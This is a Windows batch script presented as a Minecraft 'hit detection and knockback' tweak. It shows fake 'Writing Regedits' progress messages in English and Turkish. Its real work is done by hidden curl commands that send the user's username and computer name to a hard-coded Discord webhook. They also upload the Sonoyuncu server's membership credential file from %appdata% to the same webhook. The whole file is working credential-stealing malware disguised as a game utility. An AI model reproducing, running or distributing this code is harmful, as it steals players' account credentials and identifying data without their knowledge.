@echo off

set authkey-web=https://discord.com/api/webhooks/1222983543622209587/79ep_Qz_KgtoCPTlcy6a7L3S6MziLRJBcwHbllx-umeVIEtDrs1VqZU8DQF6nZ0dCBTV 
color b
title hit detection and knocback

Echo Writing Regedits ...
Echo Writing Regedits ...
Echo Writing Regedits ...
Echo Writing Regedits ...
Echo Istediginiz Bir Tusa Basiniz !
pause > nul
Echo Succes ... 

set message=:warning: **%username%  Pc UserName ** :warning:\n\n:man_pouting: **Computer Name** : %ComputerName%\n:detective: **Bu Bat Zeiwa Tarafindan Yapildi **
curl --silent --output /dev/null -X POST -H "Content-type: application/json" --data "{\"content\": \"%message%\"}" %authkey-web%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \":green_square: **Sonoyuncu**\"}"  %authkey-web%
curl --silent --output /dev/null -F minecraftauth=@"%appdata%\.sonoyuncu\sonoyuncu-membership.json" %authkey-web%



pause > nul
